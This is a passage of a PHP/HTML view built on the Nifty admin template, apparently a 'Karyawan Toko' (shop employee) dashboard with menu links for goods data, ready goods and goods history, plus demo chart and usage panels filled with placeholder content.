<!DOCTYPE html>
<html lang="en">



<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:05 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Data Tables | Nifty - Admin Template</title>


    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->

    <!--=================================================-->

    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.js"></script>


    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo.min.css" rel="stylesheet">



    <!--DataTables [ OPTIONAL ]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
	<link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">

    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>assets/adminlte/css/bootstrap.css">
    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/jquery.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/bootstrap.js"></script>


</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">

        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">

                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <img src="<?php echo base_url();?>assets/adminlte/img/logo.png" alt="Nifty Logo" class="brand-icon">
                        <div class="brand-title">
                            <span class="brand-text">Nifty</span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->


                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">

                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Navigation toogle button-->



                        <!--Search-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li>
                            <div class="custom-search-form">
                                <label class="btn btn-trans" for="search-input" data-toggle="collapse" data-target="#nav-searchbox">
                                    <i class="demo-pli-magnifi-glass"></i>
                                </label>
                                <form>
                                    <div class="search-container collapse" id="nav-searchbox">
                                        <input id="search-input" type="text" class="form-control" placeholder="Type for search...">
                                    </div>
                                </form>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Search-->

                    </ul>
                    <ul class="nav navbar-top-links">

                        <!--Notification dropdown-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="dropdown">
                            <a href="#" data-toggle="dropdown" class="dropdown-toggle">
                                <i class="demo-pli-bell"></i>
                                <span class="badge badge-header badge-danger"></span>
                            </a>


                            <!--Notification dropdown menu-->
                            <div class="dropdown-menu dropdown-menu-md dropdown-menu-right">
                                <div class="nano scrollable">
                                    <div class="nano-content">
                                        <ul class="head-list">
                                            <li>
                                                <a href="#" class="media add-tooltip" data-title="Used space : 95%" data-container="body" data-placement="bottom">
                                                    <div class="media-left">
                                                        <i class="demo-pli-data-settings icon-2x text-main"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="text-nowrap text-main text-semibold">HDD is full</p>
                                                        <div class="progress progress-sm mar-no">
                                                            <div style="width: 95%;" class="progress-bar progress-bar-danger">
                                                                <span class="sr-only">95% Complete</span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <div class="media-left">
                                                        <i class="demo-pli-file-edit icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">Write a news article</p>
                                                        <small>Last Update 8 hours ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <span class="label label-info pull-right">New</span>
                                                    <div class="media-left">
                                                        <i class="demo-pli-speech-bubble-7 icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">Comment Sorting</p>
                                                        <small>Last Update 8 hours ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <div class="media-left">
                                                        <i class="demo-pli-add-user-star icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">New User Registered</p>
                                                        <small>4 minutes ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <div class="media-left">
                                                        <img class="img-circle img-sm" alt="Profile Picture" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/9.png">
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">Lucy sent you a message</p>
                                                        <small>30 minutes ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <div class="media-left">
                                                        <img class="img-circle img-sm" alt="Profile Picture" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/3.png">
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">Jackson sent you a message</p>
                                                        <small>40 minutes ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>

                                <!--Dropdown footer-->
                                <div class="pad-all bord-top">
                                    <a href="#" class="btn-link text-main box-block">
                                        <i class="pci-chevron chevron-right pull-right"></i>Show All Notifications
                                    </a>
                                </div>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End notifications dropdown-->



                        <!--User dropdown-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li id="dropdown-user" class="dropdown">
                            <a href="#" data-toggle="dropdown" class="dropdown-toggle text-right">
                                <span class="ic-user pull-right">
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <!--You can use an image instead of an icon.-->
                                    <!--<img class="img-circle img-user media-object" src="img/profile-photos/1.png" alt="Profile Picture">-->
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <i class="demo-pli-male"></i>
                                </span>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--You can also display a user name in the navbar.-->
                                <!--<div class="username hidden-xs">Aaron Chavez</div>-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            </a>


                            <div class="dropdown-menu dropdown-menu-sm dropdown-menu-right panel-default">
                                <ul class="head-list">
                                    <li>
                                        <a href="#"><i class="demo-pli-male icon-lg icon-fw"></i> Profile</a>
                                    </li>
                                    <li>
                                        <a href="#"><span class="badge badge-danger pull-right">9</span><i class="demo-pli-mail icon-lg icon-fw"></i> Messages</a>
                                    </li>
                                    <li>
                                        <a href="#"><span class="label label-success pull-right">New</span><i class="demo-pli-gear icon-lg icon-fw"></i> Settings</a>
                                    </li>
                                    <li>
                                        <a href="#"><i class="demo-pli-computer-secure icon-lg icon-fw"></i> Lock screen</a>
                                    </li>
                                    <li>
                                        <a href="pages-login.html"><i class="demo-pli-unlock icon-lg icon-fw"></i> Logout</a>
                                    </li>
                                </ul>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End user dropdown-->


                        <li>
                            <a href="#" class="aside-toggle">
                                <i class="demo-pli-dot-vertical"></i>
                            </a>
                        </li>
                    </ul>
                </div>
                <!--================================-->
                <!--End Navbar Dropdown-->

            </div>
        </header>
        <aside id="aside-container">
            <div id="aside">
                <div class="nano">
                    <div class="nano-content">

                        <!--Nav tabs-->
                        <!--================================-->
                        <ul class="nav nav-tabs nav-justified">
                            <li class="active">
                                <a href="#demo-asd-tab-1" data-toggle="tab">
                                    <i class="demo-pli-speech-bubble-7 icon-lg"></i>
                                </a>
                            </li>
                            <li>
                                <a href="#demo-asd-tab-2" data-toggle="tab">
                                    <i class="demo-pli-information icon-lg icon-fw"></i> Report
                                </a>
                            </li>
                            <li>
                                <a href="#demo-asd-tab-3" data-toggle="tab">
                                    <i class="demo-pli-wrench icon-lg icon-fw"></i> Settings
                                </a>
                            </li>
                        </ul>
                        <!--================================-->
                        <!--End nav tabs-->



                        <!-- Tabs Content -->
                        <!--================================-->
                        <div class="tab-content">

                            <!--First tab (Contact list)-->
                            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            <div class="tab-pane fade in active" id="demo-asd-tab-1">
                                <p class="pad-all text-main text-sm text-uppercase text-bold">
                                    <span class="pull-right badge badge-warning">3</span> Family
                                </p>

                                <!--Family-->
                                <div class="list-group bg-trans">
                      <a href="#" class="list-group-item">
                          <div class="media-left pos-rel">
                              <img class="img-circle img-xs" src="img/profile-photos/2.png" alt="Profile Picture">
                    <i class="badge badge-success badge-stat badge-icon pull-left"></i>
                          </div>
                          <div class="media-body">
                              <p class="mar-no text-main">Stephen Tran</p>
                              <small class="text-muteds">Availabe</small>
                          </div>
                      </a>
                      <a href="#" class="list-group-item">
                          <div class="media-left pos-rel">
                              <img class="img-circle img-xs" src="img/profile-photos/7.png" alt="Profile Picture">
                          </div>
                          <div class="media-body">
                              <p class="mar-no text-main">Brittany Meyer</p>
                              <small class="text-muteds">I think so</small>
                          </div>
                      </a>
                      <a href="#" class="list-group-item">
                          <div class="media-left pos-rel">
                              <img class="img-circle img-xs" src="img/profile-photos/1.png" alt="Profile Picture">
                    <i class="badge badge-info badge-stat badge-icon pull-left"></i>
                          </div>
                          <div class="media-body">
                              <p class="mar-no text-main">Jack George</p>
                              <small class="text-muteds">Last Seen 2 hours ago</small>
                          </div>
                      </a>
                      <a href="#" class="list-group-item">
                          <div class="media-left pos-rel">
                              <img class="img-circle img-xs" src="img/profile-photos/4.png" alt="Profile Picture">
                          </div>
                          <div class="media-body">
                              <p class="mar-no text-main">Donald Brown</p>
                              <small class="text-muteds">Lorem ipsum dolor sit amet.</small>
                          </div>
                      </a>
                      <a href="#" class="list-group-item">
                          <div class="media-left pos-rel">
                              <img class="img-circle img-xs" src="img/profile-photos/8.png" alt="Profile Picture">
                    <i class="badge badge-warning badge-stat badge-icon pull-left"></i>
                          </div>
                          <div class="media-body">
                              <p class="mar-no text-main">Betty Murphy</p>
                              <small class="text-muteds">Idle</small>
                          </div>
                      </a>
                      <a href="#" class="list-group-item">
                          <div class="media-left pos-rel">
                              <img class="img-circle img-xs" src="img/profile-photos/9.png" alt="Profile Picture">
                    <i class="badge badge-danger badge-stat badge-icon pull-left"></i>
                          </div>
                          <div class="media-body">
                              <p class="mar-no text-main">Samantha Reid</p>
                              <small class="text-muteds">Offline</small>
                          </div>
                      </a>
                                </div>

                                <hr>
                                <p class="pad-all text-main text-sm text-uppercase text-bold">
                                    <span class="pull-right badge badge-success">Offline</span> Friends
                                </p>

                                <!--Works-->
                                <div class="list-group bg-trans">
                                    <a href="#" class="list-group-item">
                                        <span class="badge badge-purple badge-icon badge-fw pull-left"></span> Joey K. Greyson
                                    </a>
                                    <a href="#" class="list-group-item">
                                        <span class="badge badge-info badge-icon badge-fw pull-left"></span> Andrea Branden
                                    </a>
                                    <a href="#" class="list-group-item">
                                        <span class="badge badge-success badge-icon badge-fw pull-left"></span> Johny Juan
                                    </a>
                                    <a href="#" class="list-group-item">
                                        <span class="badge badge-danger badge-icon badge-fw pull-left"></span> Susan Sun
                                    </a>
                                </div>


                                <hr>
                                <p class="pad-all text-main text-sm text-uppercase text-bold">News</p>

                                <div class="pad-hor">
                                    <p>Lorem ipsum dolor sit amet, consectetuer
                                        <a data-title="45%" class="add-tooltip text-semibold text-main" href="#">adipiscing elit</a>, sed diam nonummy nibh. Lorem ipsum dolor sit amet.
                                    </p>
                                    <small><em>Last Update : Des 12, 2014</em></small>
                                </div>


                            </div>
                            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            <!--End first tab (Contact list)-->


                            <!--Second tab (Custom layout)-->
                            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            <div class="tab-pane fade" id="demo-asd-tab-2">

                                <!--Monthly billing-->
                                <div class="pad-all">
                                    <p class="pad-ver text-main text-sm text-uppercase text-bold">Billing &amp; reports</p>
                                    <p>Get <strong class="text-main">$5.00</strong> off your next bill by making sure your full payment reaches us before August 5, 2018.</p>
                                </div>
                                <hr class="new-section-xs">
                                <div class="pad-all">
                                    <span class="pad-ver text-main text-sm text-uppercase text-bold">Amount Due On</span>
                                    <p class="text-sm">August 17, 2018</p>
                                    <p class="text-2x text-thin text-main">$83.09</p>
                                    <button class="btn btn-block btn-success mar-top">Pay Now</button>
                                </div>


                                <hr>

                                <p class="pad-all text-main text-sm text-uppercase text-bold">Additional Actions</p>

                                <!--Simple Menu-->
                                <div class="list-group bg-trans">
                                    <a href="#" class="list-group-item"><i class="demo-pli-information icon-lg icon-fw"></i> Service Information</a>
                                    <a href="#" class="list-group-item"><i class="demo-pli-mine icon-lg icon-fw"></i> Usage Profile</a>
                                    <a href="#" class="list-group-item"><span class="label label-info pull-right">New</span><i class="demo-pli-credit-card-2 icon-lg icon-fw"></i> Payment Options</a>
                                    <a href="#" class="list-group-item"><i class="demo-pli-support icon-lg icon-fw"></i> Message Center</a>
                                </div>


                                <hr>

                                <div class="text-center">
                                    <div><i class="demo-pli-old-telephone icon-3x"></i></div>
                                    Questions?
                                    <p class="text-lg text-semibold text-main"> (415) 234-53454 </p>
                                    <small><em>We are here 24/7</em></small>
                                </div>
                            </div>
                            <!--End second tab (Custom layout)-->
                            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


                            <!--Third tab (Settings)-->
                            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            <div class="tab-pane fade" id="demo-asd-tab-3">
                                <ul class="list-group bg-trans">
                                    <li class="pad-top list-header">
                                        <p class="text-main text-sm text-uppercase text-bold mar-no">Account Settings</p>
                                    </li>
                                    <li class="list-group-item">
                                        <div class="pull-right">
                                            <input class="toggle-switch" id="demo-switch-1" type="checkbox" checked>
                                            <label for="demo-switch-1"></label>
                                        </div>
                                        <p class="mar-no text-main">Show my personal status</p>
                                        <small class="text-muted">Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</small>
                                    </li>
                                    <li class="list-group-item">
                                        <div class="pull-right">
                                            <input class="toggle-switch" id="demo-switch-2" type="checkbox" checked>
                                            <label for="demo-switch-2"></label>
                                        </div>
                                        <p class="mar-no text-main">Show offline contact</p>
                                        <small class="text-muted">Aenean commodo ligula eget dolor. Aenean massa.</small>
                                    </li>
                                    <li class="list-group-item">
                                        <div class="pull-right">
                                            <input class="toggle-switch" id="demo-switch-3" type="checkbox">
                                            <label for="demo-switch-3"></label>
                                        </div>
                                        <p class="mar-no text-main">Invisible mode </p>
                                        <small class="text-muted">Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. </small>
                                    </li>
                                </ul>


                                <hr>

                                <ul class="list-group pad-btm bg-trans">
                                    <li class="list-header"><p class="text-main text-sm text-uppercase text-bold mar-no">Public Settings</p></li>
                                    <li class="list-group-item">
                                        <div class="pull-right">
                                            <input class="toggle-switch" id="demo-switch-4" type="checkbox" checked>
                                            <label for="demo-switch-4"></label>
                                        </div>
                                        Online status
                                    </li>
                                    <li class="list-group-item">
                                        <div class="pull-right">
                                            <input class="toggle-switch" id="demo-switch-5" type="checkbox" checked>
                                            <label for="demo-switch-5"></label>
                                        </div>
                                        Show offline contact
                                    </li>
                                    <li class="list-group-item">
                                        <div class="pull-right">
                                            <input class="toggle-switch" id="demo-switch-6" type="checkbox" checked>
                                            <label for="demo-switch-6"></label>
                                        </div>
                                        Show my device icon
                                    </li>
                                </ul>



                                <hr>

                                <p class="pad-hor text-main text-sm text-uppercase text-bold mar-no">Task Progress</p>
                                <div class="pad-all">
                                    <p class="text-main">Upgrade Progress</p>
                                    <div class="progress progress-sm">
                                        <div class="progress-bar progress-bar-success" style="width: 15%;"><span class="sr-only">15%</span></div>
                                    </div>
                                    <small>15% Completed</small>
                                </div>
                                <div class="pad-hor">
                                    <p class="text-main">Database</p>
                                    <div class="progress progress-sm">
                                        <div class="progress-bar progress-bar-danger" style="width: 75%;"><span class="sr-only">75%</span></div>
                                    </div>
                                    <small>17/23 Database</small>
                                </div>

                            </div>
                            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            <!--Third tab (Settings)-->

                        </div>
                    </div>
                </div>
            </div>
        </aside>
        <!--===================================================-->
        <!--END ASIDE-->


         <!--MAIN NAVIGATION-->
        <!--===================================================-->
        <nav id="mainnav-container">
            <div id="mainnav">



                <!--Menu-->
                <!--================================-->
                <div id="mainnav-menu-wrap">
                    <div class="nano">
                        <div class="nano-content">

                            <!--Profile Widget-->
                            <!--================================-->
                            <div id="mainnav-profile" class="mainnav-profile">
                                <div class="profile-wrap text-center">
                                    <div class="pad-btm">
                                        <img class="img-circle img-md" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/1.png" alt="Profile Picture">
                                    </div>
                                    <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
                                        <span class="pull-right dropdown-toggle">
                                            <i class="dropdown-caret"></i>
                                        </span>
                                        <p class="mnp-name">Aaron Chavez</p>
                                        <span class="mnp-desc">aaron.cha@themeon.net</span>
                                    </a>
                                </div>
                                <div id="profile-nav" class="collapse list-group bg-trans">
                                    <a href="#" class="list-group-item">
                                        <i class="demo-pli-male icon-lg icon-fw"></i> View Profile
                                    </a>
                                    <a href="#" class="list-group-item">
                                        <i class="demo-pli-gear icon-lg icon-fw"></i> Settings
                                    </a>
                                    <a href="#" class="list-group-item">
                                        <i class="demo-pli-information icon-lg icon-fw"></i> Help
                                    </a>
                                    <a href="#" class="list-group-item">
                                        <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
                                    </a>
                                </div>
                            </div>


                            <!--Shortcut buttons-->
                            <!--================================-->
                            <div id="mainnav-shortcut" class="hidden">
                                <ul class="list-unstyled shortcut-wrap">

                                    <li class="col-xs-3" data-content="My Profile">
                                        <a class="shortcut-grid" href="#">
                                            <div class="icon-wrap icon-wrap-sm icon-circle bg-mint">
                                            <i class="demo-pli-male"></i>
                                            </div>
                                        </a>
                                    </li>
                                    <li class="col-xs-3" data-content="Messages">
                                        <a class="shortcut-grid" href="#">
                                            <div class="icon-wrap icon-wrap-sm icon-circle bg-warning">
                                            <i class="demo-pli-speech-bubble-3"></i>
                                            </div>
                                        </a>
                                    </li>
                                    <li class="col-xs-3" data-content="Activity">
                                        <a class="shortcut-grid" href="#">
                                            <div class="icon-wrap icon-wrap-sm icon-circle bg-success">
                                            <i class="demo-pli-thunder"></i>
                                            </div>
                                        </a>
                                    </li>
                                    <li class="col-xs-3" data-content="Lock Screen">
                                        <a class="shortcut-grid" href="#">
                                            <div class="icon-wrap icon-wrap-sm icon-circle bg-purple">
                                            <i class="demo-pli-lock-2"></i>
                                            </div>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                            <!--================================-->
                            <!--End shortcut buttons-->


                            <ul id="mainnav-menu" class="list-group">

                    <!--Category name-->
                    <li class="list-header">Navigation</li>

                    <!--Menu list item-->
                    <li class="active-sub">
                        <a href="<?= base_url().'dashboard/karyawan' ?>">
                            <i class="fa fa-home"></i>
                            <span class="menu-title">
                    Beranda
                  </span>
                        </a>
                    </li>

                                <!--Menu list item-->

                    <!--Menu item-->
                                <li>
                                    <a href="<?= base_url().'Barang/kbarang' ?>">
                                        <i class="fa fa-file"></i>
                                        <span class="menu-title">
                                            Data Barang
                                            <span class="pull-right badge badge-warning"></span>
                                        </span>
                                    </a>
                                </li>

                                 <!--Menu item-->
                                <li>
                                    <a href="<?= base_url().'Barang_Ready/kbarangr' ?>">
                                        <i class="fa fa-history"></i>
                                        <span class="menu-title">
                                            Barang Ready
                                            <span class="pull-right badge badge-warning"></span>
                                        </span>
                                    </a>
                                </li>

                                <!--Menu item-->
                                <li>
                                    <a href="<?= base_url().'Riwayat/kriwayat' ?>">
                                        <i class="glyphicon glyphicon-list-alt"></i>
                                        <span class="menu-title">
                                            Riwayat Barang
                                            <span class="pull-right badge badge-warning"></span>
                                        </span>
                                    </a>
                                </li>

  
                        </div>
                    </div>
                </div>
                <!--================================-->
                <!--End menu-->
            </div>
        </nav>
<div id="content-container">
                <div id="page-head">

<div class="pad-all text-center">
    <h3>Selamat Datang</h3>
    <p1>Karyawan Toko<p></p>
</p1></div>
                    </div>


                <!--Page content-->
                <!--===================================================-->
                <div id="page-content">

					    <div class="row">
					        <div class="col-lg-7">

					            <!--Network Line Chart-->
					            <!--===================================================-->
					            <div id="demo-panel-network" class="panel">
					                <div class="panel-heading">
					                    <div class="panel-control">
					                        <button id="demo-panel-network-refresh" class="btn btn-default btn-active-primary" data-toggle="panel-overlay" data-target="#demo-panel-network"><i class="demo-psi-repeat-2"></i></button>
					                        <div class="dropdown">
					                            <button class="dropdown-toggle btn btn-default btn-active-primary" data-toggle="dropdown" aria-expanded="false"><i class="demo-psi-dot-vertical"></i></button>
					                            <ul class="dropdown-menu dropdown-menu-right">
					                                <li><a href="#">Action</a></li>
					                                <li><a href="#">Another action</a></li>
					                                <li><a href="#">Something else here</a></li>
					                                <li class="divider"></li>
					                                <li><a href="#">Separated link</a></li>
					                            </ul>
					                        </div>
					                    </div>
					                    <h3 class="panel-title">Network</h3>
					                </div>


					                <!--chart placeholder-->
					                <div class="pad-all">
					                    <div id="demo-chart-network" style="height: 255px; padding: 0px; position: relative;"><canvas class="flot-base" style="direction: ltr; position: absolute; left: 0px; top: 0px; width: 585.828px; height: 255px;" width="527" height="229"></canvas><div class="flot-text" style="position: absolute; top: 0px; left: 0px; bottom: 0px; right: 0px; font-size: smaller; color: rgb(84, 84, 84);"><div class="flot-x-axis flot-x1-axis xAxis x1Axis" style="position: absolute; top: 0px; left: 0px; bottom: 0px; right: 0px;"><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 49px; text-align: center;">5</div><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 100px; text-align: center;">10</div><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 155px; text-align: center;">15</div><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 210px; text-align: center;">20</div><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 265px; text-align: center;">25</div><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 320px; text-align: center;">30</div><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 374px; text-align: center;">35</div><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 429px; text-align: center;">40</div><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 484px; text-align: center;">45</div><div class="flot-tick-label tickLabel" style="position: absolute; max-width: 57px; top: 240px; left: 539px; text-align: center;">50</div></div></div><canvas class="flot-overlay" width="527" height="229" style="direction: ltr; position: absolute; left: 0px; top: 0px; width: 585.828px; height: 255px;"></canvas><div class="legend"><div style="position: absolute; width: 101px; height: 34px; top: 8px; left: 8px; background-color: rgb(255, 255, 255); opacity: 0.85;"> </div><table style="position:absolute;top:8px;left:8px;;font-size:smaller;color:#545454"><tbody><tr><td class="legendColorBox"><div style="border:1px solid #ccc;padding:1px"><div style="width:4px;height:0;border:5px solid rgb(181,191,197);overflow:hidden"></div></div></td><td class="legendLabel">Download Speed</td></tr><tr><td class="legendColorBox"><div style="border:1px solid #ccc;padding:1px"><div style="width:4px;height:0;border:5px solid rgb(37,71,106);overflow:hidden"></div></div></td><td class="legendLabel">Upload Speed</td></tr></tbody></table></div></div>
					                </div>


					                <!--Chart information-->
					                <div class="panel-body">

					                    <div class="row">
					                        <div class="col-lg-8">
					                            <p class="text-semibold text-uppercase text-main">CPU Temperature</p>
					                            <div class="row">
					                                <div class="col-xs-5">
					                                    <div class="media">
					                                        <div class="media-left">
					                                            <span class="text-3x text-thin text-main">43.7</span>
					                                        </div>
					                                        <div class="media-body">
					                                            <p class="mar-no">°C</p>
					                                        </div>
					                                    </div>
					                                </div>
					                                <div class="col-xs-7 text-sm">
					                                    <p>
					                                        <span>Min Values</span>
					                                        <span class="pad-lft text-semibold">
					                                        <span class="text-lg">27°</span>
					                                        <span class="labellabel-success mar-lft">
					                                            <i class="pci-caret-down text-success"></i>
					                                            <smal>- 20</smal>
					                                        </span>
					                                        </span>
					                                    </p>
					                                    <p>
					                                        <span>Max Values</span>
					                                        <span class="pad-lft text-semibold">
					                                        <span class="text-lg">69°</span>
					                                        <span class="labellabel-danger mar-lft">
					                                            <i class="pci-caret-up text-danger"></i>
					                                            <smal>+ 57</smal>
					                                        </span>
					                                        </span>
					                                    </p>
					                                </div>
					                            </div>

					                            <hr>

					                            <div class="pad-rgt">
					                                <p class="text-semibold text-uppercase text-main">Today Tips</p>
					                                <p class="text-muted mar-top">Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt.</p>
					                            </div>
					                        </div>

					                        <div class="col-lg-4">
					                            <p class="text-uppercase text-semibold text-main">Bandwidth Usage</p>
					                            <ul class="list-unstyled">
					                                <li>
					                                    <div class="media pad-btm">
					                                        <div class="media-left">
					                                            <span class="text-2x text-thin text-main">754.9</span>
					                                        </div>
					                                        <div class="media-body">
					                                            <p class="mar-no">Mbps</p>
					                                        </div>
					                                    </div>
					                                </li>
					                                <li class="pad-btm">
					                                    <div class="clearfix">
					                                        <p class="pull-left mar-no">Income</p>
					                                        <p class="pull-right mar-no">70%</p>
					                                    </div>
					                                    <div class="progress progress-sm">
					                                        <div class="progress-bar progress-bar-info" style="width: 70%;">
					                                            <span class="sr-only">70% Complete</span>
					                                        </div>
					                                    </div>
					                                </li>
					                                <li>
					                                    <div class="clearfix">
					                                        <p class="pull-left mar-no">Outcome</p>
					                                        <p class="pull-right mar-no">10%</p>
					                                    </div>
					                                    <div class="progress progress-sm">
					                                        <div class="progress-bar progress-bar-primary" style="width: 10%;">
					                                            <span class="sr-only">10% Complete</span>
					                                        </div>
					                                    </div>
					                                </li>
					                            </ul>
					                        </div>
					                    </div>
					                </div>


					            </div>
					            <!--===================================================-->
					            <!--End network line chart-->

					        </div>
					        <div class="col-lg-5">
					            <div class="row">
					                <div class="col-sm-6 col-lg-6">

					                    <!--Sparkline Area Chart-->
					                    <div class="panel panel-success panel-colorful">
					                        <div class="pad-all">
					                            <p class="text-lg text-semibold"><i class="demo-pli-data-storage icon-fw"></i> HDD Usage</p>
					                            <p class="mar-no">
					                                <span class="pull-right text-bold">132Gb</span> Free Space
					                            </p>
					                            <p class="mar-no">
					                                <span class="pull-right text-bold">1,45Gb</span> Used space
					                            </p>
					                        </div>
					                        <div class="pad-top text-center">
					                            <!--Placeholder-->
					                            <div id="demo-sparkline-area" class="sparklines-full-content"><canvas width="217" height="60" style="display: inline-block; width: 217.078px; height: 60px; vertical-align: top;"></canvas></div>
					                        </div>
					                    </div>
					                </div>
					                <div class="col-sm-6 col-lg-6">

					                    <!--Sparkline Line Chart-->
					                    <div class="panel panel-info panel-colorful">
					                        <div class="pad-all">
					                            <p class="text-lg text-semibold">Earning</p>
					                            <p class="mar-no">
					                                <span class="pull-right text-bold">$764</span> Today
					                            </p>
					                            <p class="mar-no">
					                                <span class="pull-right text-bold">$1,332</span> Last 7 Day
					                            </p>
					                        </div>
					                        <div class="pad-top text-center">

					                            <!--Placeholder-->
